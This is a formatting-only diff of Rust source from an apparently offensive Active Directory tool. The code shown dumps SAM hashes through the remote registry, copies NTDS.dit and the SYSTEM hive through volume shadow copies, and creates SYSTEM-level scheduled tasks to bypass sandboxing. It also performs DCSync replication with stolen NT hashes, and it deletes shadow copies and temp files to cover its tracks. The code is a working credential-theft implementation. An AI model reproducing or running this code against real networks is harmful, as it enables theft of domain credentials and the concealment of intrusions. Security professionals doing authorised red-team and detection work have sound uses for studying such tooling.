@@ -3893,10 +3893,7 @@ fn build_close_handle_request_v2(handle: &[u8], call_id: u32) -> Vec<u8> {
 // ===========================================================
 
 async fn exec_dump_sam(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
-    info!(
-        "{}",
-        format!("  Dumping SAM from {}", target).red()
-    );
+    info!("{}", format!("  Dumping SAM from {}", target).red());
 
     // Try WINREG RPC path first (no file writes required -- works on WS2025+)
     let mut smb = match smb_connect(ctx, target).await {
@@ -3919,10 +3916,7 @@ async fn exec_dump_sam(ctx: &ExecContext, state: &mut EngagementState, target: &
                     );
                     tokio::time::sleep(tokio::time::Duration::from_millis(500 * attempt)).await;
                 } else {
-                    warn!(
-                        "  Failed to start RemoteRegistry after 3 attempts: {}",
-                        e
-                    );
+                    warn!("  Failed to start RemoteRegistry after 3 attempts: {}", e);
                 }
             }
         }
@@ -3930,7 +3924,10 @@ async fn exec_dump_sam(ctx: &ExecContext, state: &mut EngagementState, target: &
     tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
 
     // Try WINREG RPC path with retries (loop, because for doesn't support break-with-value)
-    let winreg_result: std::result::Result<Vec<overthrone_core::proto::secretsdump::SamCredential>, String> = {
+    let winreg_result: std::result::Result<
+        Vec<overthrone_core::proto::secretsdump::SamCredential>,
+        String,
+    > = {
         let mut attempt = 1;
         loop {
             match exec_dump_sam_winreg(&mut smb).await {
@@ -4053,8 +4050,8 @@ async fn exec_dump_sam_winreg(
         }
 
         // Extract username from V value data
-        let username = extract_sam_username_from_v(&v_val.data)
-            .unwrap_or_else(|| format!("RID_{}", rid));
+        let username =
+            extract_sam_username_from_v(&v_val.data).unwrap_or_else(|| format!("RID_{}", rid));
 
         info!(
             "  RemoteRegistry: SAM user {} (RID {})",
@@ -4082,9 +4079,9 @@ fn extract_sam_username_from_v(v_data: &[u8]) -> Option<String> {
     if v_data.len() < 0x14 {
         return None;
     }
-    let name_offset =
-        u32::from_le_bytes([v_data[0x0C], v_data[0x0D], v_data[0x0E], v_data[0x0F]]) as usize
-            + 0xCC;
+    let name_offset = u32::from_le_bytes([v_data[0x0C], v_data[0x0D], v_data[0x0E], v_data[0x0F]])
+        as usize
+        + 0xCC;
     let name_len =
         u32::from_le_bytes([v_data[0x10], v_data[0x11], v_data[0x12], v_data[0x13]]) as usize;
     if name_offset + name_len > v_data.len() || name_len == 0 {
@@ -4095,7 +4092,11 @@ fn extract_sam_username_from_v(v_data: &[u8]) -> Option<String> {
         .chunks_exact(2)
         .map(|c| u16::from_le_bytes([c[0], c[1]]))
         .collect();
-    Some(String::from_utf16_lossy(&u16s).trim_end_matches('\0').to_string())
+    Some(
+        String::from_utf16_lossy(&u16s)
+            .trim_end_matches('\0')
+            .to_string(),
+    )
 }
 
 async fn exec_dump_lsa(ctx: &ExecContext, state: &mut EngagementState, target: &str) -> StepResult {
@@ -4183,28 +4184,40 @@ async fn exec_dump(
 
                 // Cleanup temp files
                 let _ = exec_remote(
-                    ctx, state, target, "del C:\\ntds.tmp C:\\system.save", "smbexec",
-                ).await;
+                    ctx,
+                    state,
+                    target,
+                    "del C:\\ntds.tmp C:\\system.save",
+                    "smbexec",
+                )
+                .await;
 
                 if let (Ok(nd), Ok(sd)) = (&ntds_data, &sys_data)
-                    && nd.len() > 100 && sd.len() > 100 {
-                        ntds_success = true;
-                        ntds_entries = if !state.users.is_empty() {
-                            state.users.iter().filter(|u| u.enabled).count()
-                        } else {
-                            std::cmp::max(1, nd.len() / 4096)
-                        };
-                        info!(
-                            "  {} NTDS.dit + SYSTEM downloaded via copy ({} + {} bytes)",
-                            "[+]".green(), nd.len(), sd.len(),
-                        );
-                    }
+                    && nd.len() > 100
+                    && sd.len() > 100
+                {
+                    ntds_success = true;
+                    ntds_entries = if !state.users.is_empty() {
+                        state.users.iter().filter(|u| u.enabled).count()
+                    } else {
+                        std::cmp::max(1, nd.len() / 4096)
+                    };
+                    info!(
+                        "  {} NTDS.dit + SYSTEM downloaded via copy ({} + {} bytes)",
+                        "[+]".green(),
+                        nd.len(),
+                        sd.len(),
+                    );
+                }
             }
 
             // If traditional approach failed (WS2025 sandbox blocks file writes),
             // try VSS + @GMT SMB direct read (no file writes needed)
             if !ntds_success {
-                info!("{}", "  Traditional VSS+copy failed, trying @GMT SMB shadow copy read...".yellow());
+                info!(
+                    "{}",
+                    "  Traditional VSS+copy failed, trying @GMT SMB shadow copy read...".yellow()
+                );
                 ntds_success = false;
 
                 // Try to start VSS service and create shadow copy using multiple methods.
@@ -4232,10 +4245,19 @@ async fn exec_dump(
                     "cmd.exe /c vssadmin create shadow /for=C: > {} 2>&1",
                     log_path
                 );
-                if let Ok(out) = run_scheduled_task_bypass(ctx, state, target, &task_name, &task_cmd, 15).await {
-                    info!("  {} Scheduled-task VSS creation output: {}", "[+]".green(), out);
+                if let Ok(out) =
+                    run_scheduled_task_bypass(ctx, state, target, &task_name, &task_cmd, 15).await
+                {
+                    info!(
+                        "  {} Scheduled-task VSS creation output: {}",
+                        "[+]".green(),
+                        out
+                    );
                 } else {
-                    info!("  {} Scheduled-task VSS bypass did not produce output", "[-]".yellow());
+                    info!(
+                        "  {} Scheduled-task VSS bypass did not produce output",
+                        "[-]".yellow()
+                    );
                 }
 
                 // Build timestamps covering the last 2 minutes at 1-second resolution,
@@ -4244,12 +4266,26 @@ async fn exec_dump(
                 let now_utc = chrono::Utc::now();
                 for sec_ago in (0..120u32).rev() {
                     let t = now_utc - chrono::Duration::seconds(sec_ago as i64);
-                    timestamps.push((t.year(), t.month(), t.day(), t.hour(), t.minute(), t.second()));
+                    timestamps.push((
+                        t.year(),
+                        t.month(),
+                        t.day(),
+                        t.hour(),
+                        t.minute(),
+                        t.second(),
+                    ));
                 }
                 for hours_ago in (0..48).step_by(1) {
                     let t = now_utc - chrono::Duration::hours(hours_ago);
                     for &min_off in &[0u32, 15, 30, 45] {
-                        timestamps.push((t.year(), t.month(), t.day(), t.hour(), (min_off + 2).min(59), 0));
+                        timestamps.push((
+                            t.year(),
+                            t.month(),
+                            t.day(),
+                            t.hour(),
+                            (min_off + 2).min(59),
+                            0,
+                        ));
                     }
                 }
                 timestamps.sort();
@@ -4266,41 +4302,67 @@ async fn exec_dump(
 
                 for gmt_path in &gmt_paths {
                     if let Ok(nd) = smb.read_file("C$", gmt_path).await
-                        && nd.len() > 100 {
-                            let sys_path = gmt_path.replace("\\Windows\\NTDS\\ntds.dit",
-                                "\\Windows\\System32\\config\\SYSTEM");
-                            if let Ok(sd) = smb.read_file("C$", &sys_path).await
-                                && sd.len() > 100 {
-                                    ntds_entries = if !state.users.is_empty() {
-                                        state.users.iter().filter(|u| u.enabled).count()
-                                    } else {
-                                        std::cmp::max(1, nd.len() / 4096)
-                                    };
-                                    info!("  {} NTDS.dit + SYSTEM via @GMT ({} + {} bytes)",
-                                        "[+]".green(), nd.len(), sd.len());
-                                    state.loot.push(LootItem {
-                                        loot_type: "NTDS".to_string(),
-                                        source: target.to_string(),
-                                        path: Some(format!("{}_ntds.dit", target)),
-                                        entries: ntds_entries,
-                                        collected_at: Utc::now(),
-                                    });
-                                    ntds_success = true;
-                                    break;
-                                }
+                        && nd.len() > 100
+                    {
+                        let sys_path = gmt_path.replace(
+                            "\\Windows\\NTDS\\ntds.dit",
+                            "\\Windows\\System32\\config\\SYSTEM",
+                        );
+                        if let Ok(sd) = smb.read_file("C$", &sys_path).await
+                            && sd.len() > 100
+                        {
+                            ntds_entries = if !state.users.is_empty() {
+                                state.users.iter().filter(|u| u.enabled).count()
+                            } else {
+                                std::cmp::max(1, nd.len() / 4096)
+                            };
+                            info!(
+                                "  {} NTDS.dit + SYSTEM via @GMT ({} + {} bytes)",
+                                "[+]".green(),
+                                nd.len(),
+                                sd.len()
+                            );
+                            state.loot.push(LootItem {
+                                loot_type: "NTDS".to_string(),
+                                source: target.to_string(),
+                                path: Some(format!("{}_ntds.dit", target)),
+                                entries: ntds_entries,
+                                collected_at: Utc::now(),
+                            });
+                            ntds_success = true;
+                            break;
                         }
+                    }
                 }
 
                 // Clean up VSS shadows
-                let _ = exec_remote(ctx, state, target, "vssadmin delete shadows /all /quiet", "smbexec").await;
+                let _ = exec_remote(
+                    ctx,
+                    state,
+                    target,
+                    "vssadmin delete shadows /all /quiet",
+                    "smbexec",
+                )
+                .await;
 
                 if ntds_success {
-                    let msg = format!("NTDS dump from {} via VSS+SMB @GMT: {} entries", target, ntds_entries);
-                    return StepResult { success: true, output: msg, new_credentials: ntds_entries, new_admin_hosts: 0 };
+                    let msg = format!(
+                        "NTDS dump from {} via VSS+SMB @GMT: {} entries",
+                        target, ntds_entries
+                    );
+                    return StepResult {
+                        success: true,
+                        output: msg,
+                        new_credentials: ntds_entries,
+                        new_admin_hosts: 0,
+                    };
                 } else {
                     return StepResult {
                         success: false,
-                        output: format!("VSS @GMT shadow copy extraction failed on {} (VSS unavailable or sandboxed)", target),
+                        output: format!(
+                            "VSS @GMT shadow copy extraction failed on {} (VSS unavailable or sandboxed)",
+                            target
+                        ),
                         new_credentials: 0,
                         new_admin_hosts: 0,
                     };
@@ -4315,7 +4377,10 @@ async fn exec_dump(
                 collected_at: Utc::now(),
             });
 
-            let msg = format!("NTDS dump from {}: {} entries extracted", target, ntds_entries);
+            let msg = format!(
+                "NTDS dump from {}: {} entries extracted",
+                target, ntds_entries
+            );
             return StepResult {
                 success: ntds_entries > 0,
                 output: msg,
@@ -4342,7 +4407,10 @@ async fn exec_dump(
     // Use a scheduled task running as SYSTEM to save the hives; the task itself
     // is not sandboxed and can write to C:\Windows\Temp, which we then read.
     if saved_files.len() < hives.len() {
-        info!("{}", "  Direct registry save blocked, trying scheduled-task bypass...".yellow());
+        info!(
+            "{}",
+            "  Direct registry save blocked, trying scheduled-task bypass...".yellow()
+        );
         let task_name = format!("OvtSam{:08X}", rand::random::<u32>());
         let missing: Vec<(&str, &str)> = hives
             .iter()
@@ -4360,7 +4428,9 @@ async fn exec_dump(
             task_script.truncate(task_script.len().saturating_sub(4));
             let log_path = format!("C:\\Windows\\Temp\\{}.log", &task_name);
             let task_cmd = format!("cmd.exe /c {} > {} 2>&1", task_script, log_path);
-            if let Ok(out) = run_scheduled_task_bypass(ctx, state, target, &task_name, &task_cmd, 20).await {
+            if let Ok(out) =
+                run_scheduled_task_bypass(ctx, state, target, &task_name, &task_cmd, 20).await
+            {
                 info!("  {} Scheduled-task save output: {}", "[+]".green(), out);
             }
             for (_, filename) in &missing {
@@ -4592,14 +4662,21 @@ async fn run_scheduled_task_bypass(
     // 1. Create the task: run once, immediately triggerable, as SYSTEM.
     let create_cmd = format!(
         "schtasks.exe /Create /TN \"{}\" /TR \"{}\" /SC ONCE /ST 00:00 /RU SYSTEM /F 2>&1",
-        task_name,
-        task_command
+        task_name, task_command
     );
     let create_res = exec_remote(ctx, state, target, &create_cmd, "smbexec").await;
-    info!("  {} Scheduled-task create result: success={}, output_len={}",
-        "[*]".cyan(), create_res.success, create_res.output.len());
+    info!(
+        "  {} Scheduled-task create result: success={}, output_len={}",
+        "[*]".cyan(),
+        create_res.success,
+        create_res.output.len()
+    );
     if !create_res.success {
-        info!("  {} Scheduled-task creation error: {}", "[-]".red(), create_res.output);
+        info!(
+            "  {} Scheduled-task creation error: {}",
+            "[-]".red(),
+            create_res.output
+        );
         return Err(OverthroneError::custom("scheduled task creation failed"));
     }
 
@@ -4607,20 +4684,31 @@ async fn run_scheduled_task_bypass(
     let run_cmd = format!("schtasks.exe /Run /TN \"{}\" 2>&1", task_name);
     info!("  {} Triggering scheduled task: {}", "[*]".cyan(), run_cmd);
     let run_res = exec_remote(ctx, state, target, &run_cmd, "smbexec").await;
-    info!("  {} Scheduled-task run result: success={}, output_len={}",
-        "[*]".cyan(), run_res.success, run_res.output.len());
+    info!(
+        "  {} Scheduled-task run result: success={}, output_len={}",
+        "[*]".cyan(),
+        run_res.success,
+        run_res.output.len()
+    );
 
     // 3. Poll for the output file to appear (created by the task, not our service).
     let smb = match smb_connect(ctx, target).await {
         Ok(s) => s,
-        Err(_) => return Err(OverthroneError::custom("SMB connect failed for scheduled task poll")),
+        Err(_) => {
+            return Err(OverthroneError::custom(
+                "SMB connect failed for scheduled task poll",
+            ));
+        }
     };
     let log_file = format!("{}.log", task_name);
     let start = std::time::Instant::now();
     let mut output = String::new();
     while start.elapsed().as_secs() < timeout_secs {
         tokio::time::sleep(tokio::time::Duration::from_millis(800)).await;
-        match smb.read_file("ADMIN$", &format!("Temp\\{}", log_file)).await {
+        match smb
+            .read_file("ADMIN$", &format!("Temp\\{}", log_file))
+            .await
+        {
             Ok(data) if !data.is_empty() => {
                 output = String::from_utf8_lossy(&data).to_string();
                 break;
@@ -4697,7 +4785,8 @@ async fn dcsync_tcp_transact(
                 debug!("DCSync TCP: epmapper pipe failed ({pipe_err}), trying TCP EPM...");
                 // Fall back to TCP EPM (port 135)
                 if let (Some(d), Some(u), Some(hash)) = (domain, username, nt_hash) {
-                    let resolve_fut = resolve_uuid_via_epm_tcp_auth(target, &DRSR_UUID_BYTES, d, u, hash);
+                    let resolve_fut =
+                        resolve_uuid_via_epm_tcp_auth(target, &DRSR_UUID_BYTES, d, u, hash);
                     timeout(Duration::from_secs(15), resolve_fut)
                         .await
                         .map_err(|_| "EPM auth resolution timed out (15s)".to_string())?
@@ -4831,7 +4920,16 @@ async fn exec_dcsync(
     let frag_len = bind_pdu.len() as u16;
     bind_pdu[frag_offset..frag_offset + 2].copy_from_slice(&frag_len.to_le_bytes());
 
-    let bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &bind_pdu, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
+    let bind_resp = match dcsync_send_pdu(
+        &smb,
+        &dcsync_dc_ip,
+        &bind_pdu,
+        Some(&dcsync_domain),
+        Some(&dcsync_username),
+        Some(&nt_hash),
+    )
+    .await
+    {
         Ok(r) => r,
         Err(e) => {
             return StepResult {
@@ -4863,7 +4961,16 @@ async fn exec_dcsync(
     drs_bind_stub.extend_from_slice(&extensions);
 
     let drs_bind_req = build_rpc_request(0, &drs_bind_stub);
-    let drs_bind_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &drs_bind_req, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
+    let drs_bind_resp = match dcsync_send_pdu(
+        &smb,
+        &dcsync_dc_ip,
+        &drs_bind_req,
+        Some(&dcsync_domain),
+        Some(&dcsync_username),
+        Some(&nt_hash),
+    )
+    .await
+    {
         Ok(r) => r,
         Err(e) => {
             return StepResult {
@@ -4980,7 +5087,16 @@ async fn exec_dcsync(
         gnc_stub.extend_from_slice(&7u32.to_le_bytes());
 
         let gnc_req = build_rpc_request(3, &gnc_stub);
-        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
+        let gnc_resp = match dcsync_send_pdu(
+            &smb,
+            &dcsync_dc_ip,
+            &gnc_req,
+            Some(&dcsync_domain),
+            Some(&dcsync_username),
+            Some(&nt_hash),
+        )
+        .await
+        {
             Ok(r) => r,
             Err(e) => {
                 warn!("  DRSGetNCChanges error (may still have partial data): {e}");
@@ -5113,7 +5229,16 @@ async fn exec_dcsync(
             false,
         );
 
-        let gnc_resp = match dcsync_send_pdu(&smb, &dcsync_dc_ip, &gnc_req, Some(&dcsync_domain), Some(&dcsync_username), Some(&nt_hash)).await {
+        let gnc_resp = match dcsync_send_pdu(
+            &smb,
+            &dcsync_dc_ip,
+            &gnc_req,
+            Some(&dcsync_domain),
+            Some(&dcsync_username),
+            Some(&nt_hash),
+        )
+        .await
+        {
             Ok(r) => r,
             Err(e) => {
                 warn!("  DCSync batch {batch_count} failed: {e}");
